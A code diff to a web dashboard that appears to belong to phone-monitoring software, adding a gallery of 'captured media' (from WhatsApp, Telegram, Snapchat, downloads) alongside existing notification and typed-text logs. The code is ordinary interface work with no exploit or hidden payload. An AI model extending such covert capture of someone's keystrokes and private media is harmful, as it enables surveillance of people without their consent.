@@ -524,9 +524,16 @@ header{
   cursor:pointer;background:var(--surf2)}
 .galthumb img{width:100%;height:100%;object-fit:cover;display:block}
 .galchk{position:absolute;inset:0;background:rgba(59,130,246,.55);
-  display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .12s}
+  display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .12s;z-index:1}
 .galthumb.on .galchk{opacity:1}
-.galapp{position:absolute;bottom:0;left:0;right:0;
+.galactions{position:absolute;top:5px;right:5px;display:flex;gap:4px;z-index:3}
+.galact{width:28px;height:28px;border-radius:50%;background:rgba(0,0,0,.58);
+  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);color:#fff;
+  display:grid;place-items:center;border:none;touch-action:manipulation}
+.galact:active{background:rgba(0,0,0,.82)}
+.galact.danger:active{background:var(--danger)}
+@media(hover:hover){.galactions{opacity:0;transition:opacity .12s}.galthumb:hover .galactions{opacity:1}}
+.galapp{position:absolute;bottom:0;left:0;right:0;z-index:2;
   background:linear-gradient(transparent,rgba(0,0,0,.72));
   font-size:10px;color:#fff;padding:14px 5px 4px;
   white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:500}
@@ -673,7 +680,7 @@ header{
 <!-- Gallery modal -->
 <div class="galmov" id="gallery" hidden>
   <div class="galhead">
-    <span class="galhtitle">Images</span>
+    <span class="galhtitle">Media</span>
     <button class="gal-selbtn nosel" id="galSelbtn" onclick="toggleGalAll()">All</button>
     <button class="gal-delbtn nosel" id="galDelbtn" onclick="deleteGalSelected()" disabled>Delete</button>
     <button class="ib" style="color:#fff" onclick="closeGallery()">
@@ -711,7 +718,7 @@ header{
       <button class="ib" id="selectBtn" onclick="toggleSel()" title="Select">
         <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round"><rect x="3" y="3" width="5" height="5" rx="1"/><rect x="10" y="3" width="5" height="5" rx="1"/><rect x="3" y="10" width="5" height="5" rx="1"/><rect x="10" y="10" width="5" height="5" rx="1"/></svg>
       </button>
-      <button class="ib" id="galleryBtn" onclick="openGallery()" title="Image gallery">
+      <button class="ib" id="galleryBtn" onclick="openGallery()" title="Media gallery">
         <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
       </button>
       <button class="ib" id="filterBtn" onclick="openDrawer()" title="Filters" style="display:none">
@@ -873,6 +880,7 @@ function imgUrl(u){return !u?'' : (u.startsWith('http')?u:`${SERVER}${u}?token=$
 // ── Item normalisation ─────────────────────────
 function normNotif(n){return{_kind:'n',_uid:'n'+n.id,...n}}
 function normText(t){return{_kind:'t',_uid:'t'+t.id,id:t.id,package_name:t.package_name,app_label:t.app_label,title:null,text_body:t.text,received_at:t.received_at,captured_at:t.captured_at,is_read:true}}
+function normMedia(m){return{_kind:'m',_uid:'m'+m.id,id:m.id,package_name:m.package_name,app_label:m.app_label,image_url:m.media_url,display_name:m.display_name,received_at:m.received_at,captured_at:m.captured_at,media_type:m.media_type,source:m.source}}
 function sortItems(){notifs.sort((a,b)=>new Date(b.received_at||b.posted_at)-new Date(a.received_at||a.posted_at))}
 
 // ── State ─────────────────────────────────────
@@ -1159,7 +1167,7 @@ async function purgeImages(){
   try{const res=await fetch(`${SERVER}/api/notifications/purge-images`,{method:'POST',headers:hdrs(),body:JSON.stringify({scope:'archived'})});const j=await res.json();alert(`Purged ${j.purged||0} image(s).`)}catch{alert('Purge failed.')}
 }
 async function clearAllHistory(){
-  if(!confirm('Delete ALL notifications and typed-text history from the server? This cannot be undone.'))return
+  if(!confirm('Delete ALL notifications, typed text, and captured media from the server? This cannot be undone.'))return
   try{
     const res=await fetch(`${SERVER}/api/history`,{method:'DELETE',headers:hdrs(),body:JSON.stringify({confirm:'DELETE ALL'})})
     const j=await res.json().catch(()=>({}))
@@ -1171,7 +1179,7 @@ async function clearAllHistory(){
     document.getElementById('selectBtn').classList.remove('on')
     closeDrawer();closeSheet()
     renderAppLists();renderFeed()
-    alert(`Deleted ${j.notifications??0} notifications and ${j.typedText??0} typed entries.`)
+    alert(`Deleted ${j.notifications??0} notifications, ${j.typedText??0} typed entries, and ${j.media??0} media items.`)
   }catch(e){alert(`Delete all failed: ${e.message||'server error'}`)}
 }
 document.getElementById('feed').addEventListener('click',()=>{document.getElementById('nb').hidden=true;newPending=0})
@@ -1234,6 +1242,7 @@ function connectSSE(){
   evs.addEventListener('connected',()=>{dot.className='sdot live';clearTimeout(reconn)})
   evs.addEventListener('notification',e=>{try{insertIncoming(normNotif(JSON.parse(e.data)))}catch{}})
   evs.addEventListener('typedtext',e=>{try{insertIncoming(normText(JSON.parse(e.data)))}catch{}})
+  evs.addEventListener('media',()=>{if(!document.getElementById('gallery').hidden&&!galSelected.size)openGallery()})
   evs.onerror=()=>{dot.className='sdot';evs.close();reconn=setTimeout(connectSSE,5000)}
 }
 
@@ -1476,28 +1485,98 @@ async function openGallery(){
   sc.className='gal-loading';sc.innerHTML='<div class="tl-spin"></div><span>Loading…</span>'
   document.getElementById('galDelbtn').disabled=true
   document.getElementById('galSelbtn').textContent='All'
+  let notifData=[],mediaData=[],okCount=0
   try{
-    const r=await fetch(`${SERVER}/api/notifications?limit=200&page=1`,{headers:hdrs()})
-    const j=await r.json()
-    galImages=(j.data||[]).filter(n=>n.image_url).map(normNotif)
-    renderGallery()
-  }catch{sc.className='gal-empty';sc.textContent='Failed to load images'}
+    const nr=await fetch(`${SERVER}/api/notifications?limit=200&page=1`,{headers:hdrs()})
+    if(nr.ok){const nj=await nr.json();notifData=nj.data||[];okCount++}
+  }catch{}
+  try{
+    const mr=await fetch(`${SERVER}/api/media?limit=200&page=1`,{headers:hdrs()})
+    if(mr.ok){const mj=await mr.json();mediaData=mj.data||[];okCount++}
+  }catch{}
+  if(!okCount){sc.className='gal-empty';sc.textContent='Failed to load media';return}
+  galImages=[
+    ...notifData.filter(n=>n.image_url).map(normNotif),
+    ...mediaData.filter(m=>m.media_url).map(normMedia)
+  ]
+  renderGallery()
 }
 function closeGallery(){document.getElementById('gallery').hidden=true;galImages=[];galSelected.clear()}
+function gallerySource(source){
+  return source==='media_store'?'device'
+    :source==='downloads'?'downloads'
+    :source==='share'?'shared'
+    :source==='android_media'?'app media'
+    :source==='whatsapp_sent'?'WhatsApp sent'
+    :source==='telegram'?'Telegram'
+    :source==='snapchat'?'Snapchat'
+    :source==='files'?'files'
+    :source||'app'
+}
 function renderGallery(){
   const sc=document.getElementById('galScroll')
-  if(!galImages.length){sc.className='gal-empty';sc.innerHTML='No images found';return}
+  if(!galImages.length){sc.className='gal-empty';sc.innerHTML='No media found';return}
   sc.className='galscroll'
   sc.innerHTML=galImages.map(n=>{
-    const app=esc(n.app_label||n.package_name.split('.').pop())
+    const label=n.app_label||n.package_name.split('.').pop()
+    const kind=n._kind==='m'?`${gallerySource(n.source)}${n.media_type==='video_thumbnail'?' · video':''}`:'notification'
+    const app=esc(`${label} · ${kind}`)
     const src=esc(imgUrl(n.image_url))
     const sel=galSelected.has(n._uid)
     return`<div class="galthumb${sel?' on':''}" data-uid="${n._uid}" onclick="toggleGalSel('${n._uid}')" ondblclick="openGalview('${esc(src)}')">
       <img src="${src}" loading="lazy" alt="">
+      <div class="galactions">
+        <button class="galact" onclick="event.stopPropagation();saveGalItem('${n._uid}')" title="Save photo">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        </button>
+        <button class="galact danger" onclick="event.stopPropagation();deleteGalItem('${n._uid}')" title="Delete photo">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>
+        </button>
+      </div>
       <span class="galapp">${app}</span>
       <div class="galchk"><svg width="20" height="20" viewBox="0 0 16 16" fill="white"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg></div>
     </div>`
   }).join('')
+}
+function galleryFilename(n){
+  const base=n._kind==='m'?(n.display_name||`${n.source||'media'}_${n.id}`):`notification_${n.id}`
+  return base.replace(/\.[A-Za-z0-9]+$/,'').replace(/[^A-Za-z0-9._-]+/g,'_')+'.jpg'
+}
+async function saveGalItem(uid){
+  const n=galImages.find(x=>x._uid===uid)
+  if(!n?.image_url)return
+  try{
+    const res=await fetch(imgUrl(n.image_url))
+    if(!res.ok) throw new Error(`HTTP ${res.status}`)
+    const blob=await res.blob()
+    const url=URL.createObjectURL(blob)
+    const a=document.createElement('a')
+    a.href=url;a.download=galleryFilename(n)
+    document.body.appendChild(a);a.click();a.remove()
+    setTimeout(()=>URL.revokeObjectURL(url),1500)
+  }catch{alert('Could not save this photo.')}
+}
+async function deleteGalItem(uid){
+  const n=galImages.find(x=>x._uid===uid)
+  if(!n)return
+  if(!confirm('Delete this photo? This cannot be undone.'))return
+  try{
+    const url=n._kind==='m'?`${SERVER}/api/media/${n.id}`:`${SERVER}/api/notifications/${n.id}`
+    const res=await fetch(url,{method:'DELETE',headers:hdrs()})
+    if(!res.ok) throw new Error(`HTTP ${res.status}`)
+    if(n._kind==='n'){
+      const idx=notifs.findIndex(x=>x._uid===uid)
+      if(idx!==-1)notifs.splice(idx,1)
+      if(appCounts[n.package_name]){
+        if(!n.is_read) appCounts[n.package_name].unread=Math.max(0,appCounts[n.package_name].unread-1)
+        appCounts[n.package_name].total=Math.max(0,appCounts[n.package_name].total-1)
+      }
+      totalCount=Math.max(0,totalCount-1)
+    }
+    galImages=galImages.filter(x=>x._uid!==uid)
+    galSelected.delete(uid)
+    renderGallery();renderAppLists()
+  }catch{alert('Delete failed.')}
 }
 function toggleGalSel(uid){
   galSelected.has(uid)?galSelected.delete(uid):galSelected.add(uid)
@@ -1515,12 +1594,17 @@ function toggleGalAll(){
 async function deleteGalSelected(){
   if(!galSelected.size)return
   const cnt=galSelected.size
-  if(!confirm(`Delete ${cnt} notification${cnt>1?'s':''} with image${cnt>1?'s':''}? This cannot be undone.`))return
-  const ids=[...galSelected].map(uid=>{const n=galImages.find(x=>x._uid===uid);return n?.id}).filter(Boolean)
+  if(!confirm(`Delete ${cnt} media item${cnt>1?'s':''}? This cannot be undone.`))return
+  const selected=[...galSelected].map(uid=>galImages.find(x=>x._uid===uid)).filter(Boolean)
+  const notifIds=selected.filter(n=>n._kind==='n').map(n=>n.id)
+  const mediaIds=selected.filter(n=>n._kind==='m').map(n=>n.id)
   try{
-    await fetch(`${SERVER}/api/notifications`,{method:'DELETE',headers:hdrs(),body:JSON.stringify({ids})})
+    await Promise.all([
+      notifIds.length?fetch(`${SERVER}/api/notifications`,{method:'DELETE',headers:hdrs(),body:JSON.stringify({ids:notifIds})}):Promise.resolve(),
+      mediaIds.length?fetch(`${SERVER}/api/media`,{method:'DELETE',headers:hdrs(),body:JSON.stringify({ids:mediaIds})}):Promise.resolve()
+    ])
     galImages=galImages.filter(n=>!galSelected.has(n._uid))
-    for(const id of ids){const idx=notifs.findIndex(n=>n.id===id);if(idx!==-1)notifs.splice(idx,1)}
+    for(const id of notifIds){const idx=notifs.findIndex(n=>n.id===id);if(idx!==-1)notifs.splice(idx,1)}
     galSelected.clear()
     renderGallery();renderAppLists()
     document.getElementById('galDelbtn').disabled=true
